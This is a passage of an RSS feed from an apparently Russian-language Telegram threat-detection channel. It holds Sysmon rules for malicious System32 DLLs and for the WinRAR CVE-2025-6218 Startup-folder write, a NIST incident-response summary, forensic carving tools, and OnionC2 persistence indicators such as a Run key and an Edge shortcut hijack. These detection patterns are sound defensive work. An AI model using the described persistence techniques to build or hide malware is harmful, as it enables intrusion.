+Для обнаружения такого поведения можем отслеживать создание dll-файлов в директории Windows\System32\
+🔭 Обнаружение:
+ProviderName="Microsoft-Windows-Sysmon" and  EventId = 11 and
+(
+TargetFilename contains \Windows\System32\TSMSISrv.dll
+or
+TargetFilename contains \Windows\System32\TSVIPSrv.dll
+)
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Видео]</description><pubDate>Tue, 02 Sep 2025 05:25:48 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_254</guid></item><item><title>и названия полезные)😂</title><link>https://t.me/detectioneasy/252</link><description>лучший opendir)
+и названия полезные)😂
+
+[Media: Фото]</description><pubDate>Mon, 18 Aug 2025 04:26:21 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_252</guid></item><item><title>У коллег из BI.ZONE вышел отчет об использовании новых уязвимостей в WinRAR</title><link>https://t.me/detectioneasy/251</link><description>Всем привет! 💻✌️
+У коллег из BI.ZONE вышел отчет об использовании новых уязвимостей в WinRAR
+Уязвимости использовались для получения доступа к хостам жертв - фишинг.
+Письмо имеет вложение - rar-архив, который эксплуатирует CVE‑2025‑6218. Уязвимость позволяет вредоносному архиву при распаковке записывать файлы за пределами целевого каталога - значит мы можем закрепиться в папку автозагрузки текущего пользователя.
+🔭 Обнаружение строится достаточно легко:
+ProviderName="Microsoft-Windows-Sysmon" and  EventId = 11 and Image endswith "winrar.exe" and TargetFilename = ".*\Microsoft\Windows\Start Menu\Programs\Startup\"
+Если атакующие продвинутые можно комбнировать несколько процедур, например заменить LNK на рабочем столе или разместить там RDP-rogue файл... Это уже будет другое правило)
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Sun, 17 Aug 2025 14:55:39 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_251</guid></item><item><title>Обратили внимание, что жизненный цикл реагирования на инциденты от NIST обновился в NIST.SP.800-61r3? Новая версия руководства интегрирована с Cybersecurity Framework (CSF) 2.0</title><link>https://t.me/detectioneasy/250</link><description>Всем привет! 💻✌️
+Обратили внимание, что жизненный цикл реагирования на инциденты от NIST обновился в NIST.SP.800-61r3? Новая версия руководства интегрирована с Cybersecurity Framework (CSF) 2.0
+На рисунке показана высокоуровневая модель жизненного цикла реагирования на инциденты, основанная на шести функциях:
+- Управление (Govern): Стратегия, ожидания и политика организации в области управления рисками кибербезопасности устанавливаются, доводятся до сведения и отслеживаются
+- Идентификация (Identify): анализируются текущие риски
+- Защита (Protect): используются меры защиты для управления рисками
+- Обнаружение (Detection): выявляются и анализируются возможные инциденты
+- Реагирование (Respond): принимаются меры по реагированию в отношении обнаруженного инцидента
+- Восстановление (Recover): восстанавливаются активы и процессы, затронутые инцидентом
+Все шесть функций взаимосвязаны и формируют непрерывный процесс, где подготовка (управление, идентификация, защита) служит фундаментом для комплексной системы защиты.
+Подготовка (управление, идентификация, защита) теперь выделена в отдельный этап, который не входит в процесс реагирования, но является основой для предотвращения инцидентов и снижения их последствий.
+Реагирование (обнаружение, реагирование, восстановление) организовано как отдельный цикл, что связано с развитием MSSP (Managed Security Service Providers) и MDR (Managed Detection and Response). Эти сервисы позволяют организациям передать на аутсорс мониторинг и реагирование на инциденты, что особенно важно для малого и среднего бизнеса.
+#dfir@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Fri, 15 Aug 2025 19:19:14 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_250</guid></item><item><title>Сталкивались ли вы с ситуацией, когда при расследовании инцидента цепочка приводит к хосту, который уже успели переустановить? 😱</title><link>https://t.me/detectioneasy/249</link><description>Всем привет 💻✌️
+Сталкивались ли вы с ситуацией, когда при расследовании инцидента цепочка приводит к хосту, который уже успели переустановить? 😱
+Вспомнил полезное видео с PHD и решил дополнить список инструментов, которые помогут в таких случаях:
+🔍 Основные из видео:
+🔤 r-studio
+🔤 photorec
+🔤 strings
+➕ Дополнение:
+🔤 binwalk
+🔤 Windows-Prefetch-Carver
+🔤 EVTXtract
+🔤 bulk_extractor
+🔤 scalpel
+А какие инструменты используете вы? Делитесь в комментах! 👇
+#dfir@detectioneasy
+
+[Media: Видео]</description><pubDate>Sun, 03 Aug 2025 18:31:07 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_249</guid></item><item><title>Давайте познакомимся с C2-фреймворком OnionC2</title><link>https://t.me/detectioneasy/247</link><description>Всем привет 💻✌️
+Давайте познакомимся с C2-фреймворком OnionC2
+Основное преимущество OnionC2 перед аналогами, по мнению автора, — это использование сети Tor для связи сервера и клиента.
+By utilizing the Tor network, it ensures that communications between the C2 server and remote systems remain secure, anonymous, and available
+🔭 Для формирования гипотез обнаружения и Threat Hunting обратим внимание на следующие особенности агента:
+🔤 Для проверки реального IP-адреса агент использует сервис https://checkip.amazonaws.com
+🔤 Из коробки идет два варианта закрепа - реестр и Shortcut Takeover
+🔤Для реестра, стандартно, отслеживаем создание ключей в *\Software\\Microsoft\\Windows\\CurrentVersion\Run\, имя ключа - Agent
+🔤 Shortcut Takeover - для изменения (или создания нового) используется ярлык %USERPROFILE%\Desktop\Microsoft Edge, целевой файл ярлыка - путь до агента, а значение аргумента - --run-lnk, укажет агенту запустить C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+🔤 Для выполнения команд используется cmd.exe /C
+#detection@detectioneasy
+#ttp@detectioneasy
+
+[Media: Фото, Видео]</description><pubDate>Fri, 18 Jul 2025 04:59:09 +0000</pubDate><guid isPermaLink="false">telegram_detectioneasy_247</guid></item></channel></rss>
